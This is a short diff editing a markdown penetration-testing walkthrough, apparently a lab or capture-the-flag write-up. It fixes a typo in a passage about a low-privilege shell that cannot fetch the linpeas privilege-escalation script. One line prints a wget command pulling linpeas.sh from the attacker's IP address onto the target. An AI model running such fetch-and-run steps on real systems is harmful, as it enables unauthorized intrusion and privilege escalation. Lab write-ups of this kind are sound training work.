@@ -167,8 +167,8 @@ ls -la home
 ls: cannot open directory home: Permission denied
 bash-4.2$ 
 ```
-``
-We also realize that we are unable to execute linepeas script here to discover privilege escalation vectors as we do not ```wget``` and ```curl``` failed to connect to our local machine
+
+We also realize that we are unable to execute linepeas script here to discover privilege escalation vectors as we do not have```wget``` and ```curl``` failed to connect to our local machine
 
 ```
 wget http://10.10.16.5:4000/linpeas.sh
